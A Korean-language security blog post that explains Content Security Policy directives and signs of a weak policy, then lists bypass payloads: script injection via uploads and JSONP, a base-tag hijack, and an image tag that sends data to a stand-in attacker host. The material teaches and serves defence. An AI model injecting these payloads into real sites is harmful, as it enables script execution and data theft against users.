---
title: "CSP (Content Security Policy)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Content Security Policy]
tags: [csp, xss, nonce, web]
description: "XSS가 생겨도 스크립트 실행·데이터 유출 경로를 좁히는 CSP의 개념과, 느슨한 정책을 무력화하는 신뢰 도메인 업로드·JSONP·base-uri 우회 구문을 정리합니다."
mermaid: true
---

> CSP는 XSS를 "없애는" 장치가 아니라, XSS가 생겨도 **스크립트가 실행되거나 데이터가 나가는 길을 좁히는** 2차 방어선이다. 정책이 느슨하면 헤더만 있고 효과는 없다.

## 개념

서버가 `Content-Security-Policy` 응답 헤더로 정책을 내리면, 브라우저는 정책에 맞지 않는 리소스 로딩·스크립트 실행을 차단한다. `script-src`가 있으면 인라인 스크립트와 `eval`이 기본 차단되고, `unsafe-inline`/`unsafe-eval`을 넣는 순간 방어 효과가 사라진다. 허용 방식은 출처 목록(host), nonce, hash 세 가지다.

주요 디렉티브:

| 디렉티브 | 역할 | 느슨함 신호 |
|---|---|---|
| `script-src` | 스크립트 출처 | `unsafe-inline`, `*`, 넓은 CDN |
| `object-src` | 플러그인 객체 | `'none'`이 아님 |
| `base-uri` | `<base>` 허용 | 미지정 → 상대경로 스크립트 탈취 |
| `frame-ancestors` | 감쌀 수 있는 부모 | 클릭재킹 방어 누락 |
| `form-action` | 폼 제출 대상 | 미지정 → 폼 외부 전송 |

응답 헤더가 `Content-Security-Policy-Report-Only`면 **아무것도 차단하지 않는다**(보고만). 로그인·에러·정적 응답은 헤더가 누락되는 경우가 많아 메인 페이지만 보고 판단하면 안 된다.

## 공격·우회 구문

정책이 있어도 느슨하면 실행된다. XSS 주입 지점과 결합해, 영향은 무해한 증거로만 보인다.

### 무력 정책

```
script-src 'self' 'unsafe-inline'     → 주입 <script> 그대로 실행
default-src *  /  script-src https:   → 사실상 허용 전부
```

### 신뢰 도메인 안의 통로

```
허용된 self/CDN 에 사용자 업로드 JS 가 text/javascript 로 서빙되면:
  <script src="/uploads/me.js"></script>
JSONP 엔드포인트(허용 도메인): <script src="https://cdn.example.com/api?callback=alert(1)"></script>
허용 CDN 전체 허용 → 그 안의 템플릿 프레임워크로 실행
```

### base-uri 미지정 (nonce 사이트)

상대경로 스크립트가 있으면 `<base>`로 로드 출처를 공격자 서버로 바꾼다.

```html
<base href="https://attacker.example/">
<!-- 이후 <script src="/js/app.js"> 가 attacker.example/js/app.js 에서 로드 -->
```

### nonce 약점·비스크립트 유출

```
nonce 가 고정·재사용(새로고침해도 동일)이면 주입 <script nonce="고정값">
스크립트가 막혀도 img-src/form-action/connect-src 가 느슨하면 데이터 전송:
  <img src="//attacker.example/?c=...">
```

## 참고 자료

- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
